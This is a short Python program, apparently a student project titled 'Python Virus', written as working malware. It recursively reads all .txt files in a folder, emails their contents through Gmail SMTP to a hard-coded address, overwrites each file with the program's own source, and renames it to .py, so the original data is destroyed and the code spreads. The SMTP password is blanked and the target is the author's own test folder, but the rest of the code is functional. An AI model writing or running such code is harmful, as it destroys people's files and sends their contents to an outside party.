#James Uttaro Project 1 - Python Virus

import smtplib
import glob
import sys
import os

#Copy_files_to_message function takes the file name, opens it and takes the text from the files
# creates a output string with all of the information from the input filename.
def copy_files_to_message(filename , msg):
    Target = open(filename,'r')
    msg = msg + filename + "\n"
    msg = msg + Target.read()+"\n EOF \n \n"
    Target.close()
    return msg;


# email login in to server , and sends message to: toaddr.
def email(message,toaddr):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login("pythonvirusproject@gmail.com", "")
    server.sendmail("pythonvirusproject@gmail.com", toaddr,message)
#password required has been taken out

# walks path and returns a string with all of the Messages as one String
def walk_file_path_Process(path,CopyString):
    msg = ""
    msg_list= ""
    Folder = glob.glob(path)
    for root, dirs, files in os.walk(path, topdown = True):
        for name in files:
            if name.endswith('.txt'):
                if name != 'JamesUttaroProject1.txt':
                    file = os.path.join(root, name)
                    msg_string = copy_files_to_message(file,msg)
                    msg_list = msg_list + msg_string
                    overwrite_withString(file,CopyString)
                    os.rename(file,ReplaceExtension(file,'.py'))
    return msg_list


#overwrites a file with a string
def overwrite_withString(DestFile, CopyString):
    Dfile = open(DestFile,'w').close()
    Dfile = open(DestFile,'w')
    Dfile.write(CopyString)
    Dfile.close()

#copys a text file into a string and returns the string

def copyFile_toString(File):
    CopyString = ""
    Cfile = open(File,'r')
    for i in Cfile:
        CopyString = CopyString + i;
    Cfile.close()
    return CopyString;

#replaces File extension with a new file extenstion with .py
def ReplaceExtension(filename,newext):
    filename = filename.rsplit( ".", 1 )[ 0 ]
    if newext == '.py':
        filename = filename + '.py'
    if newext == '.txt':
        filename = filename + '.txt'
    
    return filename


#takes the Program file name, copies this entire program into a txt file and writes it to a txt file with the same name
# AS the programs name with .txt extension
# I use this to write overwrite the rest of the txt files with new new text file containing this Entire code.
def ProgramtoTextFile(ProgramFile):
    ProgramString = copyFile_toString(ProgramFile)
    TextFileName = ReplaceExtension(ProgramFile,'.txt')
    File = open(TextFileName,'w')
    File.write(ProgramString)
    File.close()
    return TextFileName




#Main

#text file containing JamesUttaroProject.py Program.
ProgramFile = '/Users/JamesUttaro/Desktop/PyVirusFiles/JamesUttaroProject1.py'

#Path we want to Infect.
Path = '/Users/JamesUttaro/Desktop/PyVirusFiles'

#Address we want to email the Orignal file contents of the all files within the Parent Path
toAddress = "pythonvirusproject@gmail.com"


ProgramTextFile = ProgramtoTextFile(ProgramFile)
CopyString = copyFile_toString(ProgramTextFile)
email(walk_file_path_Process(Path,CopyString),toAddress)




